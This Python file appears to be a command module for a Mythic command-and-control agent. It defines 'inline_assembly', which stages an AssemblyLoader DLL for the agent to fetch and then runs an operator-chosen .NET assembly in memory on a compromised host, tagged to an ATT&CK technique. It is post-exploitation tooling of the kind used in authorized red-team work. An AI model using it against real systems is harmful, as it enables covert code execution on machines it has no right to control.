from mythic_payloadtype_container.MythicCommandBase import *
import json
from uuid import uuid4
from sRDI import ShellcodeRDI
from mythic_payloadtype_container.MythicRPC import *
from os import path
import base64

class InlineAssemblyArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {}

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Require an assembly to execute.\n\tUsage: {}".format(InlineAssemblyCommand.help_cmd))
        parts = self.command_line.split(" ", maxsplit=1)
        self.add_arg("assembly_name", parts[0])
        self.add_arg("assembly_arguments", "")
        if len(parts) == 2:
            self.add_arg("assembly_arguments", parts[1])


class InlineAssemblyCommand(CommandBase):
    cmd = "inline_assembly"
    needs_admin = False
    help_cmd = "inline_assembly [Assembly.exe] [args]"
    description = "Executes a .NET assembly with the specified arguments in a disposable AppDomain. This assembly must first be known by the agent using the `register_assembly` command."
    version = 2
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@thiagomayllart"
    argument_class = InlineAssemblyArguments
    attackmapping = ["T1547"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.args.add_arg("pipe_name", str(uuid4()))
        dllPath = path.join(self.agent_code_path, "AssemblyLoader_{}.dll".format(task.callback.architecture))
        dllBytes = open(dllPath, 'rb').read()
        file_resp = await MythicRPC().execute("create_file",
                                              task_id=task.id,
                                              file=base64.b64encode(dllBytes).decode(),
                                              delete_after_fetch=True)
        if file_resp.status == MythicStatus.Success:
            task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
            task.display_params = "Running inline_assembly: {}".format(path.basename(dllPath))
        else:
            raise Exception("Failed to register execute-assembly DLL: " + file_resp.error)
        return task

    async def process_response(self, response: AgentResponse):
        pass
